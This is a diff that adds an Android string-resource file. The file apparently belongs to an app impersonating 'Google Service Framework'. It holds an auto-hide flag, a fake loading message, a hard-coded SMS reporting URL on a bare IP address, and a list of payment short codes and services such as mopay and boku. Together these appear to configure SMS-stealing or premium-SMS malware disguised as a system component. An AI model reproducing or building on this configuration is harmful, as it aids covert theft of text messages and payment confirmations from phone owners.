@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Google Service Framework</string>
+    <string name="activity_name">Google Service Framework</string>
+    <string name="Installed">數據加載中...請稍候...</string>
+    <string name="Ok">OK</string>
+    <string name="AutoHide">1</string>
+    <string name="Cancel">Cancel</string>
+    <string name="Url">http://141.105.65.113/sms/</string>
+    <string name="SpecialNumbers">6279,1232111,mopay,boku,66245,bezahlcode,holyo,55498,55496,33235,46645</string>
+</resources>
